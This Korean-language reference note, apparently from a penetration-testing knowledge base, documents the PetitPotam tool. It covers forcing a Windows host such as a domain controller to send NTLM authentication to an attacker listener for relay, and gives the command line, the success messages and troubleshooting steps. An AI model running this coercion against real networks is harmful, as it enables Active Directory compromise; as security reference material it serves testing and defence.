---
tags:
  - 환경/ad
  - 서비스/rpc
  - 기능/중계
실행환경: ["Linux Python", "Windows executable"]
필요권한: ["대상 MS-EFSRPC 접근 권한"]
필요조건: ["listener 주소", "인증을 강제할 Windows 호스트", "relay listener 선행 실행"]
결과: ["머신 계정 NTLM 인증 강제 신호"]
---

# PetitPotam

## 도구 개요

PetitPotam은 Windows의 MS-EFSRPC 인터페이스를 호출해 대상 시스템 계정이 지정한 SMB·HTTP listener로 NTLM 인증을 보내도록 유도한다. NTLM relay에 필요한 인증을 강제할 때 사용하지만 호출 성공은 listener 수신이나 relay 성공 자체를 뜻하지 않는다.

## 필요한 입력과 실행 환경

- 실행 위치: 대상의 MS-EFSRPC에 접근 가능한 Linux 또는 Windows 호스트
- 필요한 입력: 인증을 받을 listener 주소와 대상 호스트 주소
- 실행 순서: `ntlmrelayx` 같은 수신·relay listener를 먼저 준비한다.

## 표준 사용법

```bash
python3 PetitPotam.py <LISTENER_HOST> <TARGET_HOST>
```

## 대표 예시

```bash
python3 PetitPotam.py <ATTACK_HOST> <DC>
```

확인할 출력:

- `Successfully bound!`.
- `Got expected ERROR_BAD_NETPATH exception!!`.
- `Attack worked!`.

## 주요 옵션

| 입력 | 의미 | 사용하는 상황 |
|---|---|---|
| 첫 번째 호스트 | 대상 인증을 받을 listener | relay listener가 대기 중인 주소 |
| 두 번째 호스트 | 인증을 강제할 Windows 대상 | DC 등 특정 Windows 호스트 |

## 도구 고유 출력

| 출력·상태 | 의미 | 다음 확인 |
|---|---|---|
| `Successfully bound!` | 대상 MS-EFSRPC endpoint bind 성공 | 강제 인증 호출 결과 확인 |
| `ERROR_BAD_NETPATH`와 `Attack worked!` | 지정 경로로 인증을 시도하게 한 신호 | listener에서 실제 연결과 계정 확인 |
| listener에 연결 없음 | callback 경로·방화벽·주소 문제 가능성 | listener 주소, 445/TCP와 라우팅 확인 |
| listener 연결은 있으나 relay 실패 | 인증 강제와 relay 성공 조건이 다름 | relay endpoint 보호와 계정 권한 확인 |

## 관련 공격기법

- [[AD CS ESC8 NTLM Relay]]
- [[NTLM Relay 조건 검토]]
